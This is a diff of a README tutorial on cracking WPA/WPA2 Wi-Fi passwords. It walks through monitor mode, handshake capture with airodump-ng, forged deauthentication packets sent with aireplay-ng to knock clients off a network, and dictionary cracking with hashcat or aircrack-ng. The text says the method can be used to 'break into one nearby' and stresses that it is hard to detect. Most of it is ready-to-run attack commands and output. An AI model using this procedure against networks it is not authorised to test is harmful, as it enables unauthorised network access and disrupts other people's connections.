@@ -1,6 +1,6 @@
 # Wi-Fi Cracking
 
-Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and Aircrack-ng/Hashcat. 
+Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and [Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/). 
 
 This is a brief walk-through tutorial that illustrates how to crack Wi-Fi networks that are secured using weak passwords. It is not exhaustive, but it should be enough information for you to test your own network's security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don't actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the [end of this document](#deauth-attack).
 
@@ -16,7 +16,7 @@ This tutorial assumes that you:
 - Are running a debian-based linux distro (preferably [Kali linux](https://www.kali.org/))
 - Have [Aircrack-ng](http://aircrack-ng.org/) installed
 	- `sudo apt-get install aircrack-ng`
-- Have a wireless card that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) (I recommend [this one](https://www.amazon.com/s/?ie=UTF8&keywords=tl+wn722n)
+- Have a wireless card that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) (I recommend [this one](https://www.amazon.com/s/?ie=UTF8&keywords=tl+wn722n). See [here](http://aircrack-ng.org/doku.php?id=compatible_cards) for more info.)
 
 ## Cracking a Wi-Fi Network
 
@@ -28,7 +28,7 @@ Begin by listing wireless interfaces that support monitor mode with:
 airmon-ng
 ```
 
-If you do not see an interface listed than your wireless card does not support monitor mode 😞.
+If you do not see an interface listed then your wireless card does not support monitor mode 😞
 
 We will assume your wireless interface name is `wlan0` but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:
 
@@ -87,9 +87,9 @@ airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
 
 Now we wait... Once you've captured a handshake, you should see something like `[ WPA handshake: bc:d3:c9:ef:d2:67` at the top right of the screen, just right of the current time. 
 
-If you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to re-connect (thus giving you a handshake), be sending malicious deauthentication packets at them. See the [deauth attack section](#deauth-attack) below for info on this. 
+If you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to reconnect, be sending malicious deauthentication packets at them. This often results in the capture of a 4-way handshake. See the [deauth attack section](#deauth-attack) below for info on this. 
 
-Once you've captured a handshake, press `ctrl-c` to quit `airodump-ng`. You should see a `.cap` file wherever you told `airodump-ng` to save the capture (likely called `-01.cap`). We will use this capture file to crack the network password, and I like to rename this file to reflect the network name we are trying to crack:
+Once you've captured a handshake, press `ctrl-c` to quit `airodump-ng`. You should see a `.cap` file wherever you told `airodump-ng` to save the capture (likely called `-01.cap`). We will use this capture file to crack the network password. I like to rename this file to reflect the network name we are trying to crack:
 
 ```bash
 mv ./-01.cap hackme.cap
@@ -97,11 +97,13 @@ mv ./-01.cap hackme.cap
 
 ### Crack the Network Password
 
-The final step is to crack the password using the captured handshake. If you have access to a GPU, I *highly* recommend using `hashcat` for password cracking. I've created a simple tool that makes hashcat super easy to use called [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat).
+The final step is to crack the password using the captured handshake. If you have access to a GPU, I **highly** recommend using `hashcat` for password cracking. I've created a simple tool that makes hashcat super easy to use called [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat). If you don't have access to a GPU, there are various online GPU cracking services that you can use, like [GPUHASH.me](https://gpuhash.me/) or [OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php). You can also try your hand at CPU cracking with Aircrack-ng.
+
+Note that both attack methods below assume a relatively weak user generated password. Most WPA/WPA2 routers come with strong 12 character random passwords that many users (rightly) leave unchanged. If you are attempting to crack one of these passwords, I recommend using the [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) dictionary files.
 
 #### Cracking With `naive-hashcat` (recommended)
 
-Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly from .
+Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly.
 
 ```bash
 cap2hccapx.bin hackme.cap hackme.hccapx
@@ -111,15 +113,24 @@ Next, download and run `naive-hashcat`:
 
 ```bash
 # download
-git clone https://github.com/brannondorsey/naive-hashcat.sh
+git clone https://github.com/brannondorsey/naive-hashcat
 cd naive-hashcat
+
+# download the 134MB rockyou dictionary file
+curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 # crack ! baby ! crack !
 # 2500 is the hashcat hash mode for WPA/WPA2
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 ```
 
-Naive-hashcat uses various dictionary, rule, combination, and mask attacks and it can take days or even months to run against strong passwords. The cracked password will be saved to hackme.pot, so check this file periodically.
+Naive-hashcat uses various [dictionary](https://hashcat.net/wiki/doku.php?id=dictionary_attack), [rule](https://hashcat.net/wiki/doku.php?id=rule_based_attack), [combination](https://hashcat.net/wiki/doku.php?id=combinator_attack), and [mask](https://hashcat.net/wiki/doku.php?id=mask_attack) (smart brute-force) attacks and it can take days or even months to run against mid-strength passwords. The cracked password will be saved to hackme.pot, so check this file periodically. Once you've cracked the password, you should see something like this as the contents of your `POT_FILE`:
+
+```
+e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
+```
+
+Where the last two fields separated by `:` are the network name and password respectively.
 
 If you would like to use `hashcat` without `naive-hashcat` see [this page](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2) for info.
 
@@ -166,7 +177,7 @@ If the password is cracked you will see a `KEY FOUND!` message in the terminal f
 
 A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. 
 
-Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) wait until you see a client (`STATION`) connected. Should look something like this, where is `64:BC:0C:48:97:F7` the client MAC.
+Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.
 
 ```
  CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
@@ -180,14 +191,22 @@ Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid 
  9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
 ```
 
-Now, leaving `airodump-ng` running open a new terminal. We will use the `aireplay-ng` command to send fake death packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.
+Now, leave `airodump-ng` running and open a new terminal. We will use the `aireplay-ng` command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.
 
 ```bash
-# -0 10 specifies we would like to send 10 deauth packets
+# -0 2 specifies we would like to send 2 deauth packets. Increase this number
+# if need be with the risk of noticably interrupting client network activity
 # -a is the MAC of the access point
 # -c is the MAC of the client
-aireplay-ng -0 10 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 ```
+
+You can optionally broadcast deauth packets to all connected clients with:
+
+```bash
+# not all clients respect broadcast deauths though
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
+``` 
 
 Once you've sent the deauth packets, head back over to your `airodump-ng` process, and with any luck you should now see something like this at the top right: `[ WPA handshake: 9C:5C:8E:C9:AB:C0`. Now that you've captured a handshake you should be ready to [crack the network password](#cracking-the-network-password).
 
@@ -206,7 +225,7 @@ airodump-ng mon0
 airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
 
 # optionally deauth a connected client to force a handshake
-aireplay-ng -0 10 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 
 ########## crack password with aircrack-ng... ##########
 
@@ -227,4 +246,6 @@ HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 
 ## Attribution
 
-Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks to the awesome authors and maintainers who work on Aircrack-ng and Hashcat.
+Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat. 
+
+Shout out to [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [hartzell](https://github.com/hartzell), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
